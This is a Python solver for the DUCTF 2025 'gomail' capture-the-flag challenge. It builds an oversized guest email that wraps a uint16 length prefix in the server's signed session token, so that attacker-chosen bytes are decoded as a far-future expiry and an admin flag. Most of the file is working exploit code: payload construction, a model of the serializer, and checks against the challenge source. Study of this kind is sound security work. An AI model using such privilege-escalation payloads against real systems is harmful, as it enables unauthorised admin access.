"""Reproduce DUCTF 2025 gomail's uint16 session-length overflow.

A valid guest login email can exceed 65535 bytes. The server writes the
complete email but truncates its *length prefix* to 16 bits. On decoding the
signed token, the next nine attacker-controlled bytes become expiry and
IsAdmin, so the server itself elevates a guest to admin.

This module constructs input for the original Go challenge and models its
binary serializer. A separate Go integration test runs the original Gin
handlers, HMAC token service, and real endpoints with a synthetic flag.
No unrelated hosts are contacted.
"""
import argparse
import re
import struct
from pathlib import Path

ADMIN_EMAIL = "mc-fat@monke.zip"
# Little-endian expiry of 8 'z' bytes is 8825501086245354106,
# far in the future compared to typical Unix timestamps.
CLAIM_SUFFIX = b"z" * 8 + b"t"
TOKEN_EMAIL_LENGTH_BITS = 16


def validate_source(claims_source: str, handlers_source: str) -> None:
    checks = (
        (claims_source, r"el\s*:=\s*uint16\(l\)"),
        (claims_source, r"ss\.writeLength\(len\(email\)\)"),
        (claims_source, r"ss\.buf\.WriteString\(email\)"),
        (claims_source, r"ss\.readEmail\(\)"),
        (claims_source, r"ss\.readExpiry\(\)"),
        (claims_source, r"ss\.readIsAdmin\(\)"),
        (handlers_source, r"lr\.Email\s*=\s*guestEmail"),
        (handlers_source, r"sH\.\(session\.Session\)\.Encode\(lr\.Email,\s*isAdmin\)"),
    )
    for text, regex in checks:
        if not re.search(regex, text):
            raise ValueError("Original Go session serialization assumptions changed")


def make_email(admin_email: str = ADMIN_EMAIL, filler: bytes = b"A") -> str:
    admin = admin_email.encode("ascii")
    if not admin or len(admin) > 0xFFFF or b"\x00" in admin:
        raise ValueError("Invalid admin email")
    if len(filler) != 1 or filler in (b"\r", b"\n", b"\x00"):
        raise ValueError("Filler must be one safe ASCII byte")
    # Decoded uint16 email length must equal exactly len(admin_email).
    # The following nine bytes are misinterpreted as expiry and admin bool.
    required = (1 << TOKEN_EMAIL_LENGTH_BITS) - len(CLAIM_SUFFIX)
    result = admin + CLAIM_SUFFIX + filler * required
    if len(result) != (1 << 16) + len(admin):
        raise AssertionError("Incorrect Go integer-overflow payload length")
    return result.decode("ascii")


def original_claims_serializer(email: str, expiry: int, is_admin: bool) -> bytes:
    """Byte-compatible subset of original Go session claims serializer."""
    raw = email.encode("utf-8")
    if expiry < 0 or expiry >= 1 << 64:
        raise ValueError("Invalid expiry")
    return (struct.pack("<H", len(raw) & 0xFFFF)
            + raw + struct.pack("<Q", expiry)
            + (b"t" if is_admin else b"f"))


def original_claims_deserializer(data: bytes) -> tuple[str, int, bool]:
    """Models Go's readEmail/readExpiry/readIsAdmin field consumption."""
    if len(data) < 2:
        raise ValueError("Truncated session")
    length = struct.unpack_from("<H", data)[0]
    if len(data) < 2 + length + 8 + 1:
        raise ValueError("Truncated claims after email")
    email = data[2:2 + length].decode("utf-8")
    expiry = struct.unpack_from("<Q", data, 2 + length)[0]
    is_admin = data[2 + length + 8:2 + length + 9] == b"t"
    return email, expiry, is_admin


def solve(claims_source: str, handlers_source: str) -> str:
    validate_source(claims_source, handlers_source)
    email = make_email()
    # The original login route sets isAdmin=false for an unknown email,
    # but the overflow gives a forged true upon later decoding.
    claims = original_claims_serializer(email, 1, False)
    recovered_email, recovered_expiry, recovered_admin = original_claims_deserializer(claims)
    if recovered_email != ADMIN_EMAIL or recovered_expiry < 2**40 or not recovered_admin:
        raise ValueError("Original Go serialization model did not escalate privileges")
    return email


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("claims_source", type=Path)
    p.add_argument("handlers_source", type=Path)
    args = p.parse_args()
    result = solve(
        args.claims_source.read_text(encoding="utf-8"),
        args.handlers_source.read_text(encoding="utf-8"),
    )
    print("Constructed Go session email bytes:", len(result.encode()))
    print("Claim prefix after uint16 wrap:", len(ADMIN_EMAIL))
    print("Locally modeled original claims:", original_claims_deserializer(
        original_claims_serializer(result, 1, False)
    ))
    print("Verify against original Gin server via go test ./... in data/gomail/app.")


if __name__ == "__main__":
    main()
